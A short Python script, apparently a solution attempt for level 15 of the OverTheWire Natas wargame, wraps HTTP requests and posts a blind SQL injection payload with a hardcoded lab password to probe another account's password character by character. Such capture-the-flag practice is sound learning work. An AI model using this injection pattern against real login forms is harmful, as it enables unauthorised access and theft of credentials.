"""sql injection functions here."""
import requests


class Sql:
    """Place Sql injection functions here."""

    def __init__(self, url, data):
        """Construct Class."""
        self.url = url
        self.data = data
        self.response = " "

    def getWebpageAuth(self, username, password):
        """Get default response from webpage that requres authentication."""
        r = requests.get(self.url, auth=(username, password))
        self.response = r

    def getWebpage(self):
        """Get default response from webpage."""
        r = requests.get(self.url)
        self.response = r

    def postPayload(self):
        """Get default response from webpage."""
        r = requests.post(self.url, self.data)
        self.response = r

    def postPayloadAuth(self, username, password):
        """Get default response from webpage that requires auth."""
        r = requests.post(self.url, data=self.data, auth=(username, password))
        self.response = r


def main():
    """Test Above stuff here."""
    url = "http://natas15.natas.labs.overthewire.org"
    data = {'username': 'natas16" and password LIKE BINARY "%' + 'a' + '%" #'}
    test = Sql(url, data)
    test.postPayloadAuth("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
    print(test.response)
    print(test.response.text)


main()
